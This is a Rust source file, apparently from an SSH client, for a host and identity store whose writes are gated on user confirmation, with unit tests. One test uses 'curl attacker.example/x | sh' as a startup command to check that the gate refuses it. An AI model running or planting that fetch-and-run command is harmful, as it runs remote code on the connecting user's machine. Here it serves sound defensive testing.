use crate::host::{Host, HostGroup};
use crate::identity::Identity;
use crate::key_reach::{self, NewReach};
use crate::startup_command::{self, NewCommand};
use crate::workspace::Workspace;
use crate::{CoreError, Result};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;

/// What a store write introduces that the user has to confirm before it is
/// written: places a vault key would sign in that no saved host lets it sign
/// in now, and startup commands hosts did not have.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Introduced {
    pub reaches: Vec<NewReach>,
    pub commands: Vec<NewCommand>,
}

impl Introduced {
    /// Everything `after` introduces over `before`; see
    /// `key_reach::introduced` and `startup_command::introduced`.
    pub fn between(before: &StoreData, after: &StoreData) -> Self {
        Self {
            reaches: key_reach::introduced(before, after),
            commands: startup_command::introduced(before, after),
        }
    }

    pub fn is_empty(&self) -> bool {
        self.reaches.is_empty() && self.commands.is_empty()
    }

    /// Why `self` cannot be written on the strength of `confirmed`, or `None`
    /// when `confirmed` covers all of it.
    fn unconfirmed_by(&self, confirmed: &Introduced) -> Option<CoreError> {
        if self.reaches.iter().any(|reach| !confirmed.reaches.contains(reach)) {
            return Some(CoreError::UnconfirmedKeyReach);
        }
        if self.commands.iter().any(|command| !confirmed.commands.contains(command)) {
            return Some(CoreError::UnconfirmedStartupCommand);
        }
        None
    }
}

/// Persistent store for non-secret data: hosts, host groups, identities, workspaces.
/// Private keys live in the vault; passwords are never stored.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct StoreData {
    #[serde(default)]
    pub hosts: Vec<Host>,
    #[serde(default)]
    pub host_groups: Vec<HostGroup>,
    #[serde(default)]
    pub identities: Vec<Identity>,
    #[serde(default)]
    pub workspaces: Vec<Workspace>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub active_workspace_id: Option<uuid::Uuid>,
}

/// The host and identity edits, as plain operations on the data, so a write can
/// be applied to a copy first to see what it would change.
impl StoreData {
    pub fn add_host(&mut self, host: Host) {
        self.hosts.push(host);
    }

    pub fn update_host(&mut self, host: Host) {
        if let Some(h) = self.hosts.iter_mut().find(|h| h.id == host.id) {
            *h = host;
        }
    }

    pub fn add_identity(&mut self, identity: Identity) {
        self.identities.push(identity);
    }

    pub fn update_identity(&mut self, identity: Identity) {
        if let Some(i) = self.identities.iter_mut().find(|i| i.id == identity.id) {
            *i = identity;
        }
    }

    /// Hosts that linked the identity go back to their own username, auth and
    /// key.
    pub fn remove_identity(&mut self, id: uuid::Uuid) {
        self.identities.retain(|i| i.id != id);
        self.hosts.iter_mut().for_each(|h| {
            if h.identity_id == Some(id) {
                h.identity_id = None;
            }
        });
    }

    /// The identity `host` links to, looked up the way a connection looks it
    /// up: the first identity with that id. `None` both when the host links
    /// nothing and when the link points at an identity that is not stored.
    pub fn linked_identity(&self, host: &Host) -> Option<&Identity> {
        let id = host.identity_id?;
        self.identities.iter().find(|i| i.id == id)
    }

    /// A copy holding only the hosts and identities, which are all that decide
    /// where a vault key can sign in. Anything else in the store is left out, so
    /// an edit run against the copy sees it empty.
    pub fn access_copy(&self) -> StoreData {
        StoreData {
            hosts: self.hosts.clone(),
            identities: self.identities.clone(),
            ..StoreData::default()
        }
    }

    /// Whether `other` holds the same hosts and identities, in the same order.
    pub fn same_hosts_and_identities(&self, other: &StoreData) -> bool {
        self.hosts == other.hosts && self.identities == other.identities
    }
}

/// The saved store, and the only way to change it.
///
/// Every write goes through `commit_confirmed`, which refuses any write that
/// lets a vault key sign in where no saved host lets it sign in yet, or gives
/// a host a startup command it did not have, unless the caller hands it an
/// [`Introduced`] covering that change. The typed writers below pass an empty
/// one, so they make every other change and fail with `UnconfirmedKeyReach` or
/// `UnconfirmedStartupCommand` on these, which keeps a writer added later from
/// making such a change by accident. Making one on purpose takes `preview` to
/// see what it would introduce, the user's confirmation of that, and
/// `commit_confirmed` with what they confirmed. Nothing here can tell whether a
/// caller really asked the user: the list is the caller's word for it.
pub struct Store {
    path: PathBuf,
    data: StoreData,
}

impl Store {
    pub fn load(path: PathBuf) -> Result<Self> {
        // Fail closed. Falling back to an empty store would drop every host,
        // identity and workspace, and the next save() would overwrite the file
        // that still holds them.
        let data = crate::fs_util::read_state_file(&path)?.unwrap_or_default();
        Ok(Self { path, data })
    }

    pub fn data(&self) -> &StoreData {
        &self.data
    }

    /// Private so that every mutation reaches disk through `commit`, which is
    /// what puts the rollback on the failure path. A caller holding a direct
    /// `save` could leave memory holding a value the file does not.
    fn save(&self) -> Result<()> {
        let raw = serde_json::to_string_pretty(&self.data)?;
        // Never write a document this same build could not read again. `load`
        // fails closed, and a failed load aborts startup, so an unloadable
        // store file leaves the app unable to open at all. Rejecting the write
        // keeps the previous file — and the previous session — intact.
        serde_json::from_str::<StoreData>(&raw).map_err(|e| CoreError::UnwritableState {
            path: self.path.display().to_string(),
            reason: e.to_string(),
        })?;
        crate::fs_util::write_private(&self.path, &raw)
    }

    /// What `edit` would introduce that needs the user's confirmation. Nothing
    /// is written, and `edit` runs on `StoreData::access_copy`, not on the
    /// whole store.
    pub fn preview(&self, edit: impl FnOnce(&mut StoreData)) -> Introduced {
        let mut after = self.data.access_copy();
        edit(&mut after);
        Introduced::between(&self.data, &after)
    }

    /// Apply `edit` to the in-memory data and persist the result, provided
    /// everything it introduces is in `confirmed`, rolling the change back when
    /// the write does not happen.
    ///
    /// A saved host that signs in with a vault key aims that key at a server, a
    /// startup command runs on every connect, and the store is written from
    /// the webview. `confirmed` is what the user was shown and allowed; an empty
    /// one admits only writes that introduce neither. Anything outside it fails
    /// with `UnconfirmedKeyReach` or `UnconfirmedStartupCommand` and nothing is
    /// written. The check runs against the store as it is when the write lands,
    /// so a write that introduces more than was confirmed by then, because the
    /// store moves on while the user decides, is refused as well.
    ///
    /// The file is the authority for what survives the session, so memory must
    /// not run ahead of it. A refused write is the case that matters: the
    /// rejected value would otherwise sit in memory and fail every later save
    /// for the rest of the session, so one bad mutation would take every
    /// unrelated edit down with it.
    pub fn commit_confirmed(
        &mut self,
        edit: impl FnOnce(&mut StoreData),
        confirmed: &Introduced,
    ) -> Result<()> {
        let previous = self.data.clone();
        edit(&mut self.data);
        let written = match Introduced::between(&previous, &self.data).unconfirmed_by(confirmed) {
            Some(refusal) => Err(refusal),
            None => self.save(),
        };
        if written.is_err() {
            self.data = previous;
        }
        written
    }

    /// A write that confirms nothing, so it cannot let a vault key sign in
    /// anywhere new or give a host a new startup command.
    fn commit(&mut self, f: impl FnOnce(&mut StoreData)) -> Result<()> {
        self.commit_confirmed(f, &Introduced::default())
    }

    // --- hosts ---
    pub fn add_host(&mut self, host: Host) -> Result<()> {
        self.commit(|data| data.add_host(host))
    }

    pub fn update_host(&mut self, host: Host) -> Result<()> {
        if !self.data.hosts.iter().any(|h| h.id == host.id) {
            return Err(CoreError::NotFound(format!("host {}", host.id)));
        }
        self.commit(|data| data.update_host(host))
    }

    pub fn remove_host(&mut self, id: uuid::Uuid) -> Result<()> {
        self.commit(|data| data.hosts.retain(|h| h.id != id))
    }

    pub fn hosts(&self) -> &[Host] {
        &self.data.hosts
    }

    // --- host groups ---
    pub fn add_group(&mut self, group: HostGroup) -> Result<()> {
        self.commit(|data| data.host_groups.push(group))
    }

    pub fn remove_group(&mut self, id: uuid::Uuid) -> Result<()> {
        self.commit(|data| {
            data.host_groups.retain(|g| g.id != id);
            data.hosts.iter_mut().for_each(|h| {
                if h.group_id == Some(id) {
                    h.group_id = None;
                }
            });
            data.identities.iter_mut().for_each(|i| {
                if i.group_id == Some(id) {
                    i.group_id = None;
                }
            });
        })
    }

    pub fn groups(&self) -> &[HostGroup] {
        &self.data.host_groups
    }

    // --- identities ---
    pub fn add_identity(&mut self, identity: Identity) -> Result<()> {
        self.commit(|data| data.add_identity(identity))
    }

    pub fn update_identity(&mut self, identity: Identity) -> Result<()> {
        if !self.data.identities.iter().any(|i| i.id == identity.id) {
            return Err(CoreError::NotFound(format!("identity {}", identity.id)));
        }
        self.commit(|data| data.update_identity(identity))
    }

    pub fn remove_identity(&mut self, id: uuid::Uuid) -> Result<()> {
        self.commit(|data| data.remove_identity(id))
    }

    pub fn identities(&self) -> &[Identity] {
        &self.data.identities
    }

    // --- workspaces ---
    /// Layouts reach the store straight from the frontend IPC surface, so the
    /// pane tree is sanitized here rather than trusting the renderer's own
    /// bounds checks.
    pub fn add_workspace(&mut self, mut ws: Workspace) -> Result<()> {
        ws.sanitize()?;
        self.commit(|data| data.workspaces.push(ws))
    }

    pub fn update_workspace(&mut self, mut ws: Workspace) -> Result<()> {
        ws.sanitize()?;
        let index = self
            .data
            .workspaces
            .iter()
            .position(|w| w.id == ws.id)
            .ok_or_else(|| CoreError::NotFound(format!("workspace {}", ws.id)))?;
        self.commit(|data| data.workspaces[index] = ws)
    }

    pub fn remove_workspace(&mut self, id: uuid::Uuid) -> Result<()> {
        self.commit(|data| {
            data.workspaces.retain(|w| w.id != id);
            if data.active_workspace_id == Some(id) {
                data.active_workspace_id = None;
            }
        })
    }

    pub fn workspaces(&self) -> &[Workspace] {
        &self.data.workspaces
    }

    pub fn set_active_workspace(&mut self, id: uuid::Uuid) -> Result<()> {
        self.commit(|data| data.active_workspace_id = Some(id))
    }
}

#[cfg(test)]
mod tests {
    use super::Store;
    use crate::host::{AuthMethod, Host, HostGroup};
    use crate::identity::Identity;
    use crate::workspace::{PaneLayout, SplitDirection, TabLayout, Workspace};
    use crate::CoreError;

    fn workspace_with_ratio(ratio: f32) -> Workspace {
        let mut ws = Workspace::new("hostile");
        ws.tabs.push(TabLayout::new(
            "tab",
            PaneLayout::Split {
                direction: SplitDirection::Horizontal,
                ratio,
                first: Box::new(PaneLayout::pane(None)),
                second: Box::new(PaneLayout::pane(None)),
            },
        ));
        ws
    }

    const ONE_HOST: &str = r#"{"hosts":[{"id":"11111111-1111-1111-1111-111111111111","label":"prod","hostname":"prod.example.com","port":22,"username":"deploy","auth":"publickey","tags":[]}],"host_groups":[],"identities":[],"workspaces":[]}"#;

    #[test]
    fn corrupt_file_is_rejected_instead_of_being_overwritten() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        std::fs::write(&path, ONE_HOST).expect("seed store");
        assert_eq!(Store::load(path.clone()).expect("load").hosts().len(), 1);

        std::fs::write(&path, r#"{"hosts":[{"id":"11111111-1111-"#).expect("truncate");
        let error = match Store::load(path.clone()) {
            Ok(_) => panic!("a corrupt store unexpectedly loaded as empty"),
            Err(error) => error,
        };
        assert!(error.to_string().contains("is corrupt"), "unexpected error: {error}");

        // The unreadable bytes are still on disk, so the data stays recoverable.
        let on_disk = std::fs::read_to_string(&path).expect("read back");
        assert!(on_disk.starts_with(r#"{"hosts":[{"id":"11111111-1111-"#));
    }

    #[test]
    fn a_loaded_store_still_saves_normally() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        std::fs::write(&path, ONE_HOST).expect("seed store");

        let mut store = Store::load(path.clone()).expect("load");
        store.add_group(HostGroup::new("group")).expect("save");

        let reloaded = Store::load(path).expect("reload");
        assert_eq!(reloaded.hosts().len(), 1);
        assert_eq!(reloaded.groups().len(), 1);
    }

    #[test]
    fn a_workspace_with_a_non_finite_ratio_is_not_stored() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        std::fs::write(&path, ONE_HOST).expect("seed store");

        let mut store = Store::load(path.clone()).expect("load");
        let hostile = workspace_with_ratio(f32::INFINITY);
        assert!(store.add_workspace(hostile.clone()).is_err());
        assert!(store.update_workspace(hostile).is_err());

        assert!(store.workspaces().is_empty());
        assert_eq!(std::fs::read_to_string(&path).expect("read back"), ONE_HOST);
        Store::load(path).expect("the store still loads");
    }

    #[test]
    fn an_out_of_range_ratio_is_snapped_rather_than_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");

        let mut store = Store::load(path.clone()).expect("load");
        store
            .add_workspace(workspace_with_ratio(12.0))
            .expect("a finite ratio saves");

        let reloaded = Store::load(path).expect("reload");
        match &reloaded.workspaces()[0].tabs[0].layout {
            PaneLayout::Split { ratio, .. } => assert_eq!(*ratio, 0.9),
            PaneLayout::Pane { .. } => panic!("expected a split"),
        }
    }

    fn key_host(hostname: &str) -> Host {
        let mut host = Host::new("prod", hostname, 22, "deploy");
        host.auth = AuthMethod::PublicKey;
        host.key_id = Some(uuid::Uuid::new_v4());
        host
    }

    #[test]
    fn a_writer_that_confirms_nothing_cannot_aim_a_vault_key_somewhere_new() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        let mut store = Store::load(path.clone()).expect("load");
        let host = key_host("attacker.example");

        let error = store
            .add_host(host.clone())
            .expect_err("a key host was saved without a confirmation");
        assert!(matches!(error, CoreError::UnconfirmedKeyReach), "{error}");
        assert!(store.hosts().is_empty());
        assert!(!path.exists(), "a refused write reached the disk");

        // The same write goes through once it carries what was confirmed.
        let confirmed = store.preview(|data| data.add_host(host.clone()));
        assert_eq!(confirmed.reaches.len(), 1);
        store
            .commit_confirmed(|data| data.add_host(host.clone()), &confirmed)
            .expect("a confirmed write saves");
        assert_eq!(Store::load(path).expect("reload").hosts()[0].id, host.id);
    }

    #[test]
    fn a_write_that_allows_more_than_was_confirmed_is_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut store = Store::load(dir.path().join("store.json")).expect("load");
        let mut identity = Identity::new("ops", "root");
        identity.auth = AuthMethod::PublicKey;
        identity.key_id = Some(uuid::Uuid::new_v4());
        for hostname in ["web.example", "db.example"] {
            let mut host = Host::new(hostname, hostname, 22, "deploy");
            host.identity_id = Some(identity.id);
            store
                .add_host(host)
                .expect("a host linking nothing stored saves");
        }

        // Only one of the two hosts the identity gives a key to was confirmed.
        let mut confirmed = store.preview(|data| data.add_identity(identity.clone()));
        assert_eq!(confirmed.reaches.len(), 2);
        confirmed.reaches.truncate(1);
        let error = store
            .commit_confirmed(|data| data.add_identity(identity.clone()), &confirmed)
            .expect_err("a write broader than its confirmation went through");
        assert!(matches!(error, CoreError::UnconfirmedKeyReach), "{error}");
        assert!(store.identities().is_empty());
    }

    #[test]
    fn writes_that_aim_no_key_anywhere_new_need_no_confirmation() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut store = Store::load(dir.path().join("store.json")).expect("load");
        let host = key_host("prod.example");
        let confirmed = store.preview(|data| data.add_host(host.clone()));
        store
            .commit_confirmed(|data| data.add_host(host.clone()), &confirmed)
            .expect("save");

        let mut renamed = host.clone();
        renamed.label = "production".into();
        store
            .update_host(renamed)
            .expect("a rename saves unconfirmed");
        store
            .remove_host(host.id)
            .expect("a removal saves unconfirmed");
        assert!(store.hosts().is_empty());
    }

    #[test]
    fn a_writer_that_confirms_nothing_cannot_set_a_startup_command() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        let mut store = Store::load(path.clone()).expect("load");
        let host = Host::new("lab", "lab.example", 22, "deploy");
        store.add_host(host.clone()).expect("a plain host saves");

        let mut running = host.clone();
        running.startup_command = Some("curl attacker.example/x | sh".into());
        let error = store
            .update_host(running.clone())
            .expect_err("a startup command was saved without a confirmation");
        assert!(matches!(error, CoreError::UnconfirmedStartupCommand), "{error}");
        assert_eq!(store.hosts()[0].startup_command, None);
        assert_eq!(Store::load(path.clone()).expect("reload").hosts()[0].startup_command, None);

        let confirmed = store.preview(|data| data.update_host(running.clone()));
        assert!(confirmed.reaches.is_empty());
        assert_eq!(confirmed.commands.len(), 1);
        store
            .commit_confirmed(|data| data.update_host(running.clone()), &confirmed)
            .expect("a confirmed command saves");

        // Changing it again is a new command, clearing it is not.
        let mut changed = running.clone();
        changed.startup_command = Some("uptime".into());
        let error = store.update_host(changed).expect_err("a changed command saved unconfirmed");
        assert!(matches!(error, CoreError::UnconfirmedStartupCommand), "{error}");
        let mut cleared = running;
        cleared.startup_command = None;
        store.update_host(cleared).expect("clearing a command saves unconfirmed");
        assert_eq!(Store::load(path).expect("reload").hosts()[0].startup_command, None);
    }

    // A refused write must not leave the rejected value in memory: it would
    // fail every later save for the rest of the session.
    #[test]
    fn a_refused_write_is_rolled_back_and_leaves_the_session_usable() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        std::fs::write(&path, ONE_HOST).expect("seed store");

        let mut store = Store::load(path.clone()).expect("load");
        let error = store
            .commit(|data| data.workspaces.push(workspace_with_ratio(f32::INFINITY)))
            .expect_err("an unloadable document must not be written");
        assert!(
            error.to_string().contains("cannot be loaded again"),
            "unexpected error: {error}"
        );

        assert!(store.workspaces().is_empty());
        assert_eq!(std::fs::read_to_string(&path).expect("read back"), ONE_HOST);

        let active = uuid::Uuid::nil();
        store
            .set_active_workspace(active)
            .expect("an unrelated edit still saves");
        assert_eq!(
            Store::load(path)
                .expect("reload")
                .data()
                .active_workspace_id,
            Some(active)
        );
    }

    // The workspace mutators reject this input, so reach past them to prove the
    // write-side guard stands on its own for any future field that can produce
    // a document the loader rejects.
    #[test]
    fn save_refuses_a_document_it_could_not_load_again() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        std::fs::write(&path, ONE_HOST).expect("seed store");

        let mut store = Store::load(path.clone()).expect("load");
        store
            .data
            .workspaces
            .push(workspace_with_ratio(f32::INFINITY));

        let error = store.save().expect_err("an unloadable document must not be written");
        assert!(
            error.to_string().contains("cannot be loaded again"),
            "unexpected error: {error}"
        );
        assert_eq!(std::fs::read_to_string(&path).expect("read back"), ONE_HOST);
    }

    // Every stat error reads as "absent" to `Path::exists`, and an empty store
    // loaded in its place is written over the real one on the next save.
    #[test]
    #[cfg(unix)]
    fn a_store_that_cannot_be_reached_is_not_loaded_as_empty() {
        let Some(loaded) =
            crate::fs_util::load_from_unsearchable_dir("store.json", ONE_HOST, Store::load)
        else {
            return;
        };
        match loaded {
            Err(CoreError::UnreadableState { path, .. }) => {
                assert!(path.ends_with("store.json"), "unexpected path: {path}");
            }
            Err(other) => panic!("expected UnreadableState, got {other}"),
            Ok(_) => panic!("an unreachable store loaded as empty"),
        }
    }

    #[test]
    fn updating_an_item_that_is_not_stored_is_an_error_and_writes_nothing() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        std::fs::write(&path, ONE_HOST).expect("seed store");
        let mut store = Store::load(path.clone()).expect("load");

        let host = Host::new("ghost", "ghost.example.com", 22, "root");
        match store.update_host(host) {
            Err(CoreError::NotFound(what)) => assert!(what.starts_with("host "), "{what}"),
            other => panic!("expected NotFound, got {other:?}"),
        }

        let identity = Identity::new("ghost", "root");
        match store.update_identity(identity) {
            Err(CoreError::NotFound(what)) => assert!(what.starts_with("identity "), "{what}"),
            other => panic!("expected NotFound, got {other:?}"),
        }

        match store.update_workspace(Workspace::new("ghost")) {
            Err(CoreError::NotFound(what)) => assert!(what.starts_with("workspace "), "{what}"),
            other => panic!("expected NotFound, got {other:?}"),
        }

        assert_eq!(store.hosts().len(), 1);
        assert!(store.identities().is_empty());
        assert!(store.workspaces().is_empty());
        assert_eq!(std::fs::read_to_string(&path).expect("read back"), ONE_HOST);
    }
}
